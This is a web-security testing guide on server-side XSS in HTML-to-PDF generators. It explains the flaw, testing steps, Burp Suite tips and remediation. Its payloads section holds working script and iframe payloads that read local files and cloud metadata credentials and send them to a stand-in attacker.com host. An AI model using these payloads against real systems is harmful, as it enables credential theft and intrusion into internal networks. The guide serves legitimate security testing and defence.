# XSS in PDF Generation

## Overview
Many web applications generate PDFs server-side from HTML templates, using tools such as wkhtmltopdf, PhantomJS, Puppeteer, Headless Chrome, or jsPDF. When user-controlled input is embedded in the HTML template before PDF generation without proper encoding or sandboxing, an attacker can inject HTML/JavaScript that executes within the headless browser's context during generation. This can lead to Server-Side XSS (SSXSS), enabling server-side requests (SSRF), file reads, and internal network access — all triggered from the PDF generator's privileged browser context.

## How It Works
The vulnerable pattern is: user input → unsanitized HTML template → headless browser renders it → PDF output. If the headless browser executes JavaScript (most do by default), injected scripts run with the browser's permissions on the server side. This grants the ability to make HTTP requests from the server's IP, read local files via `file:///`, access internal network endpoints (SSRF), and in some cases read environment variables or cloud metadata services (e.g., AWS IMDS at `http://169.254.169.254/`). The "XSS" is effectively executing on the server, not the client, making it a form of SSRF/LFI rather than client-side exploitation.

## Impact
- Server-Side Request Forgery (SSRF) — making requests to internal services from the PDF generator's context
- Local File Read — using `file:///etc/passwd`, `file:///proc/self/environ`
- Cloud metadata access — `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1)
- Internal network port scanning via JavaScript fetch calls
- Disclosure of internal API responses by embedding them in the generated PDF
- Reflected XSS in PDF preview modes that render the PDF inline
- In some cases, RCE through vulnerable PDF library parsing

## Where to Look
- "Export to PDF" / "Download as PDF" buttons
- Invoice, receipt, or report generation features
- Email-to-PDF conversion features
- Resume/CV builders that output PDF
- Contract or document generation features
- HTML-to-PDF conversion APIs
- Data export features where the exported format is HTML/PDF

## Testing Steps
1. Identify PDF generation features in the application.
2. Locate all user-controlled fields that appear in the generated PDF output.
3. Inject an HTML probe (e.g., `<b>test</b>`) and check if bold text appears in the PDF — this confirms HTML injection.
4. If HTML injection is confirmed, inject a `<script>` tag with an out-of-band payload pointing to your server.
5. Also inject `<img>` tags with your server URL to test if the PDF generator makes outbound requests.
6. Test SSRF by injecting a request to the internal metadata service or internal hosts.
7. Test local file read by injecting an `<iframe src="file:///etc/passwd">` or `<script>` that fetches and exfiltrates file contents.
8. Download the resulting PDF and examine it for rendered content or signs of execution.
9. Check the server's outbound HTTP logs (if accessible) for callbacks confirming SSRF.

## Payloads / Techniques

**HTML injection probe:**
```html
<b>HTMLINJECTED</b>
<h1>XSS TEST</h1>
<u>underline test</u>
```

**SSRF via img tag (makes server-side request):**
```html
<img src="https://attacker.com/ssrf-callback?from=pdf-generator">
```

**Script for out-of-band SSRF (wkhtmltopdf executes JS):**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/callback?data=' + window.location.href, false);
xhr.send();
</script>
```

**Local file read (wkhtmltopdf):**
```html
<script>
x = new XMLHttpRequest();
x.onload = function() {
  document.write('<pre>'+this.responseText+'</pre>');
};
x.open('GET', 'file:///etc/passwd');
x.send();
</script>
```
This embeds `/etc/passwd` content directly in the generated PDF.

**Cloud metadata SSRF (AWS IMDSv1):**
```html
<script>
x = new XMLHttpRequest();
x.onload = function() {
  var i = new Image();
  i.src = 'https://attacker.com/imds?d=' + encodeURIComponent(this.responseText);
};
x.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
x.send();
</script>
```

**Internal network request:**
```html
<script>
fetch('http://192.168.1.1/admin').then(r => r.text()).then(t => {
  fetch('https://attacker.com/internal?d=' + btoa(t));
});
</script>
```

**iframe for local file disclosure:**
```html
<iframe src="file:///etc/hosts" width="500" height="500"></iframe>
<iframe src="file:///proc/self/environ" width="500" height="500"></iframe>
```

**Annotation/link injection in PDF (if PDFKit/ReportLab is used):**
Some PDF libraries render certain annotations. Inject PDF annotation syntax if the template uses a different PDF library:
```
--annotation-open alert('xss')
```

**cURL to test PDF with injected name:**
```bash
curl -X POST https://victim.com/api/generate-pdf \
     -H 'Content-Type: application/json' \
     -d '{"name":"<script>document.write(document.cookie)</script>","template":"invoice"}'
```

## Burp Suite Tips
- Intercept the PDF generation request in **Burp Proxy** and use **Repeater** to modify input fields with HTML/JS payloads.
- Use **Burp Collaborator** as the callback server for SSRF payloads in `<img src>` and `<script>` fetch requests.
- Download the generated PDF and open it in a PDF viewer that supports JavaScript (Adobe Acrobat) to check for client-side JS execution.
- Use **Burp's Search** to find all parameters that end up in the PDF — compare request fields against PDF content.
- After injecting the metadata SSRF payload, check **Burp Collaborator** for incoming HTTP requests from the server's IP.
- Use **Intruder** to fuzz all text fields in the PDF generation request with a list of HTML injection probes.
- Install the **PDF Viewer** Burp extension to inspect PDF responses directly in Burp.

## Tools
- Burp Suite Pro (Collaborator for OOB)
- interactsh — https://github.com/projectdiscovery/interactsh
- curl (manual testing)
- wkhtmltopdf — https://wkhtmltopdf.org/ (local reproduction of vulnerabilities)
- SSRFmap — https://github.com/swisskyrepo/SSRFmap
- gopherus — https://github.com/tarunkant/Gopherus (SSRF exploitation)
- CloudFox (cloud metadata enumeration after SSRF)

## Remediation
- **Sanitize HTML before PDF generation**: HTML-encode all user-supplied values before inserting them into the HTML template. Use a vetted sanitization library.
- **Disable JavaScript in the PDF generator**: Configure wkhtmltopdf or Puppeteer with `--disable-javascript` / `--no-javascript` flags to prevent script execution.
- **Restrict network access**: Run the PDF generator in a network-isolated container or sandbox with no access to internal networks, metadata services, or the filesystem.
- **Block `file://` and internal URLs**: Configure the headless browser to block navigation to `file://` URIs and non-routable IP ranges.
- **Use a content-safe PDF library**: Consider using libraries that do not render arbitrary HTML (e.g., ReportLab in Python for structured output) rather than converting HTML directly.
- **Least privilege**: Run the PDF generator as a minimal-privilege service account with no cloud credentials and no access to sensitive files.
- **Input validation**: Reject or strip HTML tags from fields that do not require HTML formatting.

## References
https://portswigger.net/research/server-side-pdf-injection
https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
https://owasp.org/www-community/vulnerabilities/Server_Side_Request_Forgery
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
